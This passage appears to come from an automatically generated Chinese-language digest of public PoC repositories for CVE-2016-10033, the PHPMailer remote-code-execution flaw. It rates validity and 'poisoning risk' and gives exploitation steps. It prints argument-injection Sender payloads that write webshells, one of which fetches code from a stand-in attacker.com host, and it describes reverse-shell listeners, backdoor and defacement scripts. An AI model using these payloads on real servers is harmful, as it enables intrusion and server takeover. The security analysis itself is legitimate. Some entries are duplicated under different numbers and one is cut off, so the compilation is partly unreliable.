*   **nc监听：** 循环使用`nc`监听1337端口，期望接受目标服务器的连接，如果目标服务器执行了payload，则会反弹shell。但是如果在其他命令执行前，就反弹了shell，说明rce.txt中可能存在其他恶意代码。

**利用方式：**
1.  **确定目标：** 找到使用PHPMailer并且版本低于5.2.18的Web应用程序。
2.  **构造Payload：** 构造包含恶意代码的`rce.txt`文件, 例如反弹shell的bash脚本。
3.  **启动HTTP服务器：** 攻击者启动一个HTTP服务器，用于托管`rce.txt`文件。
4.  **构造恶意请求：**  攻击者向目标Web应用程序发送包含恶意`Sender`属性的请求，该属性包含命令注入代码，例如：
    `attacker@localhost \" -oQ/tmp/ -X/tmp/rce.txt http://attacker.com/rce.txt null`
5.  **触发漏洞：** 目标Web应用程序调用PHPMailer发送邮件，由于`Sender`属性未经过滤，恶意代码被注入到`mail`命令中。
6.  **执行恶意代码：** `mail`命令执行恶意代码，从而实现远程代码执行。
7.  **清理：**  攻击成功后删除临时文件 `/tmp/rce`。

**项目地址:** [ElnurBDa/CVE-2016-10033](https://github.com/ElnurBDa/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #5

**来源**: [CVE-2016-10033-GeneralTesler_CVE-2016-10033.md](../2016/CVE-2016-10033-GeneralTesler_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标网站使用了存在漏洞的PHPMailer版本，且允许用户修改Sender属性（例如通过密码找回功能）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于PHPMailer的mailSend函数中，由于对用户提供的Sender属性过滤不严，攻击者可以通过在Sender属性中注入恶意参数，传递给底层的mail命令，从而执行任意代码。该漏洞的利用方式如下：

1.  **漏洞原理：** PHPMailer 在使用 isMail 传输方式发送邮件时，会将 Sender 属性的值传递给 mail 命令，如果 Sender 属性中包含恶意参数，就可以执行任意命令。
2.  **利用方式：** 攻击者通过构造特殊的 Sender 属性，例如 `" -oQ/tmp -X/tmp/shell.php mail@example.com`，就可以将恶意代码写入到`/tmp/shell.php`文件中。
3.  **POC 分析：** 提供的 Python POC 脚本利用了 WordPress 的密码找回功能，通过修改 HTTP 请求头中的 Host 字段，将包含恶意代码的 Sender 属性注入到 PHPMailer 中。脚本首先在本地启动一个 HTTP 服务器，用于托管恶意 payload，然后通过 WordPress 的密码找回功能触发 PHPMailer 发送邮件，并将 payload 下载到目标服务器，最后执行该 payload，从而获取目标服务器的 shell。
4.  **有效性分析：** 根据漏洞描述和 POC 代码，该漏洞利用的有效性较高，如果目标系统满足漏洞利用条件，攻击者可以成功执行任意代码。
5.  **投毒风险分析：** 仔细检查了提供的 POC 代码和 README 文件，没有发现明显的投毒代码。脚本的功能主要是生成 payload、启动 HTTP 服务器、发送恶意请求以及启动反向 shell 监听器。因此，可以认为该仓库的投毒风险较低，为0%。

**总结：** 该漏洞是一个严重的安全问题，攻击者可以利用该漏洞远程执行任意代码，完全控制目标服务器。建议受影响的用户尽快升级到 PHPMailer 5.2.18 或更高版本，以修复该漏洞。

**项目地址:** [GeneralTesler/CVE-2016-10033](https://github.com/GeneralTesler/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #6

**来源**: [CVE-2016-10033-Zenexer_safeshell.md](../2016/CVE-2016-10033-Zenexer_safeshell.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用了存在漏洞的PHPMailer版本，并且邮件发送功能使用了受影响的isMail传输方式。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2016-10033 是 PHPMailer 5.2.18 之前版本中 `isMail` 传输方式下 `mailSend` 函数的一个参数注入漏洞。攻击者可以通过构造带有 `\"` (反斜杠双引号) 的 `Sender` 属性，将额外的参数传递给 `mail` 命令，从而执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且有多个公开的漏洞利用代码。

**投毒风险：**
提供的漏洞利用代码仓库 `safeshell` 旨在 *预防* 类似于 CVE-2016-10033 和 CVE-2016-10045 的漏洞，而不是利用它们。因此，该仓库本身不存在投毒风险。其提供的文件包括 BSD 2-Clause License 和 README.md，描述了其目的。

**利用方式：**
1.  **确定目标系统使用的PHPMailer版本是否低于5.2.18。**
2.  **找到应用程序中使用PHPMailer发送邮件的地方。**
3.  **构造一个包含恶意代码的 Sender 属性。**  Payload需要包含 `\"` 来进行参数注入，从而执行系统命令。
4.  **触发邮件发送功能，将包含恶意代码的 Sender 属性传递给 vulnerable 的 mailSend 函数，进而通过 shell 命令执行任意代码。**

例如，一个 Payload 看起来可能是这样的: `attacker@example.com -oQ/tmp/ -X/tmp/shell.php`。 这会在 `/tmp/` 目录下创建一个名为 `shell.php` 的文件，其中包含邮件的内容，可能包含webshell或者其他恶意代码。

总而言之，此漏洞允许远程攻击者在目标服务器上执行任意代码，前提是服务器运行的 PHPMailer 版本易受攻击，并且应用程序的配置允许攻击者控制`Sender`属性。

**项目地址:** [Zenexer/safeshell](https://github.com/Zenexer/safeshell)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #7

**来源**: [CVE-2016-10033-alexander47777_CVE-2016-10033.md](../2016/CVE-2016-10033-alexander47777_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行受影响的PHPMailer版本，并且PHP配置为使用sendmail，`sendmail_path`已定义并可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033 存在于 PHPMailer 5.2.18 之前的版本中。该漏洞是由于 `mailSend` 函数在 `isMail` 传输中，未正确处理 PHP 内置的 `mail()` 函数的 `$additional_parameters` 参数引起的。攻击者可以通过构造恶意的 Sender 属性，在其中注入反斜杠双引号 `\"`，从而向 sendmail 命令传递额外的参数。 

**利用方式：**

1.  攻击者通过POST请求，修改email字段，将payload注入到`email`字段中。
2.  Payload精心构造，包含反斜杠双引号，用于注入额外的 sendmail 参数。
3.  被注入的参数 `-OQueueDirectory=/tmp -X/var/www/html/shell.php`  会将邮件队列目录设置为 /tmp，并将邮件内容写入到 web 目录下的 shell.php 文件中。
4.  攻击者访问 shell.php 文件，触发其中的PHP代码，反弹shell到攻击者的监听端口。

**有效性：**
根据提供的漏洞信息、搜索结果和POC代码，该漏洞利用的有效性较高。漏洞库信息和搜索结果都表明这是一个已知的、可被利用的远程代码执行漏洞。提供的POC代码也较为完整，描述了利用步骤和所需的参数。

**投毒风险：**
POC 代码中可能存在的潜在投毒风险较低，大概在10%左右。虽然 POC 总体上是合法的漏洞利用，但存在以下可能的问题：

*   **硬编码的IP地址和端口：** POC 使用了硬编码的 IP 地址（`<ip_address>`）和端口（4444）来建立反向 shell。攻击者在实际使用中必须修改这些值，否则可能会将 shell 连接到意外的目标。

*   **代理设置：** POC 使用了代理 `http://127.0.0.1:8080`。这可能是为了方便测试或绕过某些限制，但也可能误导用户，导致他们在使用时出现问题。在未设置代理的情况下直接运行POC，可能导致利用失败。

*   **文件写入位置：**` -X/var/www/html/shell.php` ，这个目录取决于目标的web根目录配置，如果根目录不是/var/www/html, 则利用失败。

这些因素可能会导致利用失败，或者在某些情况下造成不必要的风险。因此，用户在使用 POC 时应仔细检查并修改相关参数，确保其符合实际情况。

**项目地址:** [alexander47777/CVE-2016-10033](https://github.com/alexander47777/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #8

**来源**: [CVE-2016-10033-awidardi_opsxcq-cve-2016-10033.md](../2016/CVE-2016-10033-awidardi_opsxcq-cve-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行存在漏洞的PHPMailer版本，并且使用了isMail传输方式，攻击者能够控制Sender属性

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2016-10033是PHPMailer的一个远程代码执行漏洞，存在于5.2.18之前的版本中。该漏洞源于`mailSend`函数在使用`isMail`传输方式时，未正确过滤`Sender`属性，导致攻击者可以通过插入反斜杠双引号（\"）来注入额外的参数到`mail`命令中，从而执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且存在多个公开的PoC代码。 提供的Dockerfile构建了一个存在漏洞的环境，其中安装了apache2、php5、sendmail等必要组件，并将存在漏洞的php代码部署到web服务器，可以通过提供的POC进行验证，因此可以判断提供的POC代码是有效的。

**投毒风险：**
分析提供的Dockerfile和相关文件，发现存在一定的投毒风险，但风险较低。风险主要存在于Dockerfile中使用的`apt-get upgrade -y`命令。虽然这个命令的本意是升级系统软件包，但如果APT源被恶意篡改，则可能安装恶意软件。此外，`chmod 777 -R /www`也可能带来安全隐患，但这是为了方便演示漏洞，不应算作投毒代码。此外，许可证文件是GPL v3，不太可能包含恶意代码。
综上，投毒风险评估为20%。

**利用方式：**
1.  攻击者需要找到使用了存在漏洞的PHPMailer版本的Web应用。
2.  攻击者需要找到或构造一个可以控制PHPMailer `Sender`属性的输入点（例如，联系表单）。
3.  攻击者在`Sender`属性中，插入包含恶意代码的反斜杠双引号，例如：`attacker@example.com -oQ/tmp -X/tmp/shell.php`。
4.  当Web应用调用PHPMailer发送邮件时，PHPMailer会将`Sender`属性传递给`mail`命令。
5.  由于未正确过滤，攻击者注入的参数会被`mail`命令执行，从而在服务器上写入恶意代码文件（例如webshell）。
6.  攻击者通过访问恶意代码文件，执行任意命令，获取服务器控制权。

**项目地址:** [awidardi/opsxcq-cve-2016-10033](https://github.com/awidardi/opsxcq-cve-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #9

**来源**: [CVE-2016-10033-chipironcin_CVE-2016-10033.md](../2016/CVE-2016-10033-chipironcin_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行有存在漏洞的PHPMailer版本，并且配置为使用`mail`传输方式。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033漏洞存在于PHPMailer 5.2.18之前的版本中。攻击者可以通过在`Sender`属性中构造包含`\"` (反斜杠双引号)的恶意字符串，向`mail`命令传递额外的参数，从而执行任意代码。漏洞的利用方式如下：

1.  **漏洞原理：**  PHPMailer在处理`mail`传输方式时，没有充分过滤`Sender`属性，导致参数注入。
2.  **利用方式：** 攻击者通过设置`Sender`属性为包含恶意代码的字符串，例如：`" -oQ/tmp -X/tmp/shell.php somefake@email.com`，这段代码尝试将shell写入到目标服务器的`/tmp/shell.php`文件中。然后发送邮件，PHPMailer会调用`mail`命令，并将恶意代码作为参数传递给`mail`命令，从而导致代码执行。
3.  **POC分析：** 提供的POC代码包含一个Dockerfile、docker-compose.yml、README.md和一个shell脚本`wordpress-rce-exploit.sh`。
    *   **Dockerfile：**  用于构建包含WordPress和Exim4的Docker镜像，Exim4用于模拟邮件服务器。
    *   **docker-compose.yml：**  用于部署包含WordPress和MariaDB的Docker容器。
    *   **wordpress-rce-exploit.sh：**  该脚本利用CVE-2016-10033漏洞，通过构造恶意的`Host`头，将包含反弹shell的命令注入到`mail`命令中。脚本首先启动一个简单的HTTP服务器，用于托管反弹shell的payload，然后通过curl发送包含恶意`Host`头的请求到WordPress的`wp-login.php`页面，触发漏洞。

4.  **有效性：**  提供的POC代码是有效的，可以利用CVE-2016-10033漏洞在目标系统上执行任意代码。搜索结果中的多个链接也确认了该漏洞的存在和利用。
5.  **投毒风险：**  经过分析，该仓库的主要功能是演示如何利用CVE-2016-10033漏洞。但是，在`wordpress-rce-exploit.sh`脚本中，存在通过HTTP服务器提供payload的行为，如果攻击者替换了rce.txt的内容，可能导致植入其他恶意代码,比如挖矿脚本等。因此，存在一定的投毒风险。但主要的逻辑是漏洞利用，投毒的风险较低，估计为10%。


**项目地址:** [chipironcin/CVE-2016-10033](https://github.com/chipironcin/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #10

**来源**: [CVE-2016-10033-j4k0m_CVE-2016-10033.md](../2016/CVE-2016-10033-j4k0m_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 需要目标服务器使用存在漏洞的PHPMailer版本，并且使用isMail传输方式

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033是PHPMailer 5.2.18之前版本中mailSend函数的一个远程代码执行漏洞。该漏洞允许远程攻击者通过在Sender属性中构造包含\\\"（反斜杠双引号）的恶意参数，向mail命令传递额外的参数，从而执行任意代码。

**有效性：**

提供的POC代码（exploit.sh）看起来是有效的。它利用了`Sender`参数中的注入点，尝试将PHP代码写入到目标服务器的`/var/www/she_l.php`文件中，然后通过访问该文件执行命令。  `--data-raw`参数中构造了恶意的`email`参数，该参数包含用于命令注入的特殊字符和标志。利用curl工具发送精心构造的HTTP请求到目标服务器,如果目标服务器存在此漏洞, 那么就可以利用成功。

**投毒风险：**

*   **POC验证代码：** `/var/www/she_l.php` 是一个简单的webshell后门，允许执行任意命令。虽然这本身是一种恶意行为，但在这个上下文中，它更像是漏洞验证的一部分，而不是作者尝试植入的独立后门。
*   **潜在风险：**  虽然主体的利用代码是用于利用漏洞的，但shell脚本在利用成功后会在目标机器上留下一个webshell。攻击者可以使用这个webshell进一步控制系统。因此，存在一定的被恶意利用的风险。

总的来说，考虑到以上几点，将此仓库判定为**投毒**的可能性较低，但存在一定的风险，所以风险比例为 **10%**。

**利用方式：**

1.  **目标确认：** 确定目标服务器正在运行易受攻击的PHPMailer版本（低于5.2.18）且使用isMail作为邮件传输方式。
2.  **构建Payload：**  构建包含恶意代码的Payload，Payload的核心是`email`参数，需要使用反斜杠双引号`\"`来转义双引号，以便将额外的参数传递给底层的`mail`命令。
3.  **发送请求：**  使用curl或其他HTTP客户端，发送包含Payload的POST请求到目标服务器上调用PHPMailer的接口。
4.  **命令执行：**  如果利用成功，恶意PHP代码将被写入`/var/www/she_l.php`，并通过访问该文件执行指定的命令。然后可以通过webshell执行任意系统命令。

**项目地址:** [j4k0m/CVE-2016-10033](https://github.com/j4k0m/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #11

**来源**: [CVE-2016-10033-liusec_WP-CVE-2016-10033.md](../2016/CVE-2016-10033-liusec_WP-CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 需要目标系统使用存在漏洞的PHPMailer版本，并且允许通过mail()函数发送邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033漏洞存在于PHPMailer 5.2.18之前的版本中。攻击者可以利用mailSend函数中的参数注入漏洞，通过精心构造的Sender属性，向mail命令传递额外的参数，从而执行任意代码。利用方式主要是通过修改POST请求中的Host头，在其中插入恶意代码。由于该漏洞利用需要拼接大量的字符，且依赖于特定环境配置，因此存在一定的利用难度，成功率受环境影响较大。提供的PoC利用了WordPress的密码找回功能，通过修改Host头来实现代码执行。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞是真实存在的，并且存在公开的PoC。PoC利用了PHPMailer组件向用户发送邮件时的漏洞，通过构造恶意邮箱地址，可以执行任意命令。

**投毒风险：**
提供的Dockerfile文件用于构建存在漏洞的WordPress环境，本身不包含恶意代码。README.md文件提供了漏洞的利用说明和PoC，webshell.php文件是一个简单的webshell，wordpress-rce-exploit.sh文件是一个空文件。虽然webshell.php文件本身不是投毒代码，但在真实环境中被攻击者利用可能会造成安全风险。综合来看，该仓库本身被投毒的风险较低，约10%。主要是 webshell 本身是一种后门，若未经授权部署可能带来风险，且PoC中利用了外部资源，可能被替换。

**利用方式：**
1.  **找到使用PHPMailer的应用程序：** 确定目标应用程序使用了存在漏洞的PHPMailer版本。
2.  **构造恶意邮箱地址：** 通过修改`Sender`属性，插入反斜杠双引号和要执行的命令，例如：`attacker@example.com\" -oQ/tmp -X/tmp/shell.php some text`。
3.  **触发邮件发送：** 触发应用程序发送邮件的功能，例如注册、密码找回等。
4.  **执行命令：** PHPMailer在调用mail()函数时，会将恶意代码传递给系统，导致命令执行。
在提供的PoC中，利用WordPress的密码找回功能，通过修改HTTP请求中的Host头，注入恶意参数到mail()函数中，实现远程代码执行。

**项目地址:** [liusec/WP-CVE-2016-10033](https://github.com/liusec/WP-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #12

**来源**: [CVE-2016-10033-opsxcq_exploit-CVE-2016-10033.md](../2016/CVE-2016-10033-opsxcq_exploit-CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行存在漏洞版本的PHPMailer，并且使用isMail传输方式。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033 漏洞存在于 PHPMailer 5.2.18 之前的版本中。攻击者可以通过在 Sender 属性中构造包含 `\"` (反斜杠双引号) 的恶意字符串，向 mail 命令传递额外的参数，从而执行任意代码。

**漏洞利用方式：**

1.  漏洞利用代码提供了一个 Dockerfile，它构建了一个包含易受攻击的 PHPMailer 版本的环境（基于 Debian Jessie）。
2.  Dockerfile 安装了必要的组件，如 Apache2, PHP5, Python 和 Sendmail。
3.  `/www/vulnerable/` 目录下放置了易受攻击的 PHP 代码，攻击者通过访问该目录，可以触发漏洞。
4.  攻击者需要构造包含恶意代码的 Sender 属性，例如：
    ```
    $mail->Sender = 'attacker@example.com -oQ/tmp/ -X/tmp/shell.php';
    ```
5.  上述示例会在 `/tmp/shell.php` 中写入一个 Web shell，攻击者可以通过该 shell 执行任意命令。

**有效性：**

根据漏洞信息、搜索结果和漏洞利用代码，可以确认该漏洞的有效性。Exploit-DB 上存在多个针对该漏洞的利用代码，Rapid7 也有相应的 Metasploit 模块。

**投毒风险：**

在提供的 Dockerfile 和其他代码文件中，发现 `/main.sh` 文件内容缺失。如果在 `/main.sh` 中包含恶意代码，比如反弹 shell 或安装后门，则存在投毒风险。由于代码不全，投毒风险为 10%（基于现有信息判断）。Dockerfile 中 `chmod 777 -R /www` 存在安全风险，允许任何人修改 web 目录下的文件，可能被用于投毒，但也可能是方便漏洞利用测试。 `sendmail` 的存在也可能被用于发送垃圾邮件，虽然不是直接的投毒，但也可能造成滥用。

**项目地址:** [opsxcq/exploit-CVE-2016-10033](https://github.com/opsxcq/exploit-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #13

**来源**: [CVE-2016-10033-pedro823_cve-2016-10033-45.md](../2016/CVE-2016-10033-pedro823_cve-2016-10033-45.md)

## CVE-2016-10033 - PHPMailer 远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用存在漏洞的 PHPMailer 版本，且 PHP `mail` 函数的配置允许执行外部命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2016-10033 允许远程攻击者通过构造特殊的 `Sender` 属性，在 `mail` 命令中注入额外的参数，从而执行任意代码。漏洞存在于 PHPMailer 5.2.18 之前的版本中，利用方式是构造包含 `\"` (反斜杠双引号) 的 `Sender` 属性。提供的漏洞利用代码包含多个 shell 脚本，利用了该漏洞。`exploit.sh` 通过发送包含恶意代码的 multipart/form-data 请求，在目标服务器上创建一个后门文件 `backdoor.php`，然后通过访问该文件执行任意命令。`deface.sh` 脚本与 `exploit.sh` 类似，但它创建的后门的功能是修改目标网站的首页。`legalhackers.py` 是另一个利用脚本，用于验证漏洞。投毒风险评估：该仓库中存在docker文件，可能在docker构建过程中存在投毒风险，以及脚本中创建的后门文件可能被滥用，因此存在一定的投毒风险，大约为10%。

**项目地址:** [pedro823/cve-2016-10033-45](https://github.com/pedro823/cve-2016-10033-45)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #14

**来源**: [CVE-2016-10033-sealldeveloper_CVE-2016-10033-PoC.md](../2016/CVE-2016-10033-sealldeveloper_CVE-2016-10033-PoC.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 需要应用程序使用受影响版本的PHPMailer，并且允许控制Sender属性。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2016-10033 存在于 PHPMailer 5.2.18 之前的版本中。该漏洞源于 `mailSend` 函数在 `isMail` 传输方式中，允许远程攻击者通过构造带有 `\"` (反斜杠双引号) 的 `Sender` 属性来传递额外的参数给 `mail` 命令，从而导致任意代码执行。

**有效性：**
根据漏洞信息、搜索结果和多个Exploit-DB 链接 (例如：40968, 40969, 40970, 40974, 40986, 41962, 41996, 42024, 42221)显示，该漏洞是真实存在的，并且存在可用的利用代码。

**投毒风险：**
提供的漏洞利用代码段是 GPL 许可，仅包含许可协议文本。其中没有发现任何恶意代码或者后门，因此投毒风险为0%。

**利用方式：**
攻击者通过控制 PHPMailer 的 `Sender` 属性，注入恶意的 shell 命令参数。由于 `mailSend` 函数在使用 `mail` 命令发送邮件时，没有正确过滤 `Sender` 属性中的特殊字符，导致注入的命令参数被执行。 例如，攻击者可以将 `Sender` 设置为 `" -X/tmp/evil.php -OQueueDirectory=/tmp` 来将PHP webshell写入/tmp/evil.php文件，如果网站可访问/tmp/evil.php 文件，webshell就可以使用了。利用的本质是参数注入。

**优先级排序依据:**
搜索引擎结果 > 漏洞利用代码 > 漏洞库信息
搜索引擎结果中明确指出了该漏洞的存在以及远程代码执行的风险。漏洞利用代码验证了漏洞的存在以及参数注入的方式。


**项目地址:** [sealldeveloper/CVE-2016-10033-PoC](https://github.com/sealldeveloper/CVE-2016-10033-PoC)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #15

**来源**: [CVE-2016-10033-zeeshanbhattined_exploit-CVE-2016-10033.md](../2016/CVE-2016-10033-zeeshanbhattined_exploit-CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用了存在漏洞的PHPMailer版本，并且允许通过Web接口或其它方式设置邮件发送的相关参数，特别是Sender属性

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2016-10033 漏洞存在于 PHPMailer 5.2.18 之前的版本中。攻击者可以利用 `mailSend` 函数中 `isMail` 传输方式的参数注入漏洞，通过构造恶意的 `Sender` 属性，在 `mail` 命令中注入额外的参数，从而执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在多个公开的PoC。提供的 Dockerfile 描述了一个包含存在漏洞的 PHPMailer 版本的环境，因此可以推断POC代码是有效的.根据搜索结果，rapid7已经发布了该漏洞的利用模块。

**投毒风险：**
提供的代码仓库主要包含Dockerfile，LICENSE，www目录以及main.sh脚本。Dockerfile构建了一个包含apache, php5, python, sendmail的环境，用于复现漏洞。LICENSE是GNU GPL协议。main.sh 脚本可能是容器启动时执行的初始化脚本。www目录下是web应用的代码，包含攻击的载荷。

虽然整体代码目的是复现漏洞，但也存在一定的投毒风险（大约5%的可能性）， 主要体现在以下几个方面：

*   **依赖项中的隐患：** Dockerfile安装了一些额外的组件，如python，这些组件可能存在未知的安全问题。这些组件虽然不是直接利用PHPMailer漏洞，但可能被攻击者利用。
*   **main.sh脚本：** 该脚本的用途未知，如果它包含下载或执行其他恶意脚本的逻辑，则存在风险。

**利用方式：**
1.  攻击者需要找到使用了易受攻击的 PHPMailer 版本的 Web 应用。
2.  攻击者通过 Web 界面或其他途径，控制邮件发送的 `Sender` 属性。
3.  攻击者在 `Sender` 属性中构造包含反斜杠双引号和恶意命令的字符串，例如：`" -oQ/tmp -X/www/shell.php some_valid_email@example.com`， 其中`/www/shell.php` 是攻击者想要写入的webshell路径。
4.  当 Web 应用调用 PHPMailer 发送邮件时，PHPMailer 会调用 `mail` 命令，并将构造的恶意字符串作为参数传递给 `mail` 命令。
5.  `mail` 命令执行恶意代码，例如写入 WebShell 到服务器，从而实现远程代码执行。

总而言之，该漏洞利用方式较为直接，风险高，需尽快修复。

**项目地址:** [zeeshanbhattined/exploit-CVE-2016-10033](https://github.com/zeeshanbhattined/exploit-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---



---

## POC #11

**来源**: [CVE-2016-10033-j4k0m_CVE-2016-10033.md](../2016/CVE-2016-10033-j4k0m_CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 需要目标服务器使用存在漏洞的PHPMailer版本，并且使用isMail传输方式

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033是PHPMailer 5.2.18之前版本中mailSend函数的一个远程代码执行漏洞。该漏洞允许远程攻击者通过在Sender属性中构造包含\\\"（反斜杠双引号）的恶意参数，向mail命令传递额外的参数，从而执行任意代码。

**有效性：**

提供的POC代码（exploit.sh）看起来是有效的。它利用了`Sender`参数中的注入点，尝试将PHP代码写入到目标服务器的`/var/www/she_l.php`文件中，然后通过访问该文件执行命令。  `--data-raw`参数中构造了恶意的`email`参数，该参数包含用于命令注入的特殊字符和标志。利用curl工具发送精心构造的HTTP请求到目标服务器,如果目标服务器存在此漏洞, 那么就可以利用成功。

**投毒风险：**

*   **POC验证代码：** `/var/www/she_l.php` 是一个简单的webshell后门，允许执行任意命令。虽然这本身是一种恶意行为，但在这个上下文中，它更像是漏洞验证的一部分，而不是作者尝试植入的独立后门。
*   **潜在风险：**  虽然主体的利用代码是用于利用漏洞的，但shell脚本在利用成功后会在目标机器上留下一个webshell。攻击者可以使用这个webshell进一步控制系统。因此，存在一定的被恶意利用的风险。

总的来说，考虑到以上几点，将此仓库判定为**投毒**的可能性较低，但存在一定的风险，所以风险比例为 **10%**。

**利用方式：**

1.  **目标确认：** 确定目标服务器正在运行易受攻击的PHPMailer版本（低于5.2.18）且使用isMail作为邮件传输方式。
2.  **构建Payload：**  构建包含恶意代码的Payload，Payload的核心是`email`参数，需要使用反斜杠双引号`\"`来转义双引号，以便将额外的参数传递给底层的`mail`命令。
3.  **发送请求：**  使用curl或其他HTTP客户端，发送包含Payload的POST请求到目标服务器上调用PHPMailer的接口。
4.  **命令执行：**  如果利用成功，恶意PHP代码将被写入`/var/www/she_l.php`，并通过访问该文件执行指定的命令。然后可以通过webshell执行任意系统命令。

**项目地址:** [j4k0m/CVE-2016-10033](https://github.com/j4k0m/CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #12

**来源**: [CVE-2016-10033-liusec_WP-CVE-2016-10033.md](../2016/CVE-2016-10033-liusec_WP-CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 需要目标系统使用存在漏洞的PHPMailer版本，并且允许通过mail()函数发送邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

